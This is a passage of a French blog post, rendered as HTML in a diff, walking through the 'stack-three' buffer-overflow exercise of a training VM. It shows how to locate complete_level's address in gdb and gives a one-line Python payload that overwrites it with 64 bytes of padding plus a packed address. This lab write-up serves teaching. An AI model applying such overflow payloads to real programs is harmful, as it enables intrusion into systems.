+<ul>
+<li>
+<p><strong>Difficultés rencontrées :</strong></p>
+<ol>
+<li><strong>Trouver l&rsquo;adresse cible :</strong> Il faut chercher dans la table des symboles (en gros, le tableau qui lie les noms de fonctions ou de variables aux adresses mémoire) l&rsquo;adresse de la fonction <code>complete_level</code>. Dans <code>gdb</code>, il faut utiliser <code>info functions</code>. L&rsquo;adresse trouvée est <code>0x40069d</code>.</li>
+<li><strong>Construire le payload :</strong> <code>print()</code> de Python 3 formate une chaîne de caractères (Unicode) et non du binaire brut, ce qui pose problème pour les caractères non-ASCII.</li>
+</ol>
+</li>
+<li>
+<p><strong>La solution:</strong>
+On utilise <code>sys.stdout.buffer.write()</code> pour écrire de la donnée brute et le <a href="https://docs.python.org/3/library/struct.html">module <code>struct</code></a> pour empaqueter l&rsquo;adresse correctement.</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#34;import struct, sys; sys.stdout.buffer.write(b&#39;A&#39; * 64 + struct.pack(&#39;&lt;Q&#39;, 0x40069d))&#34;</span> | ./stack-three
+</span></span></code></pre></div><p><strong>Explictions du payload :</strong></p>
+<ul>
+<li><code>b'A' * 64</code> : Une suite de &lsquo;A&rsquo; en format <em>bytes</em> (octets).</li>
+<li><code>struct.pack('&lt;Q', 0x40069d)</code> : Construit la suite binaire au format <strong>Little Endian</strong> (<code>&lt;</code>) sur 64 bits (<code>Q</code> pour Quadword) à partir de l&rsquo;adresse hexadécimale.</li>
+</ul>
+<h1 id="conclusions">Conclusions</h1>
+<p>Ces quatre premiers défis sont relativement faciles à résoudre une fois les outils en main. Un peu de pratique permet de comprendre les failles et de les exploiter. Cette VM a, d&rsquo;ailleurs, un certain nombre de protections désactivées par défaut, comme l&rsquo;ASLR qui permet la randomisation des adresses mémoires et crée un obstacle au reverse engineering</p>
+<hr>
+<p>Le nom de ce billet est inspiré du <a href="https://phrack.org/issues/49/14_md#article">fameux article publié dans Phrack</a> qui a fait connaître ce type d&rsquo;exploit.</p>
+<p>Stay curious!</p>
+</section>
+
+  
+  
+
+  
+  
+  
+
+</article>
+
+
+    </main>
+
+    <footer
+  class="opaco mx-auto flex h-[4.5rem] max-w-3xl items-center px-8 text-[0.9em] opacity-60"
+>
+  <div class="mr-auto">
+    &copy; 2026
+    <a class="link" href="http://localhost:1313/">Carnet de thèse</a>
+  </div>
+  <a class="link mx-6" href="https://gohugo.io/" rel="noopener" target="_blank"
+    >Powered by Hugo️️</a
+  >️
+  <a
+    class="link"
+    href="https://github.com/nanxiaobei/hugo-paper"
+    rel="noopener"
+    target="_blank"
+    >✎ Paper</a
+  >
+</footer>
+
+  </body>
+</html>
